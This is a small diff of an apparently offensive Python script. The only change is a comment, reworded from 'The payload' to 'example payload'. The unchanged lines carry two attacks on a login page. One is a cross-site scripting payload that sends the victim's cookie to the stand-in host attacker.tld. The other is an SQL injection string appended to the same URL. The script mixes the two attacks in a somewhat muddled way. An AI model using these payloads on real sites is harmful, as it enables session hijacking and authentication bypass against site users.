@@ -6,7 +6,7 @@
 import requests
 # The URL of the vulnerable website & attacker
 url = "http://vulnerable-website.tld/login?username=<script>document.location='http://attacker.tld/log?cookie='+document.cookie;</script>"
-# The payload to inject SQL code, set to your needs
+# example payload to inject SQL code, set to your needs
 payload = "' OR 'a'='a';--"
 # The final URL with the injected SQL code
 url_with_injected_sql = url + payload
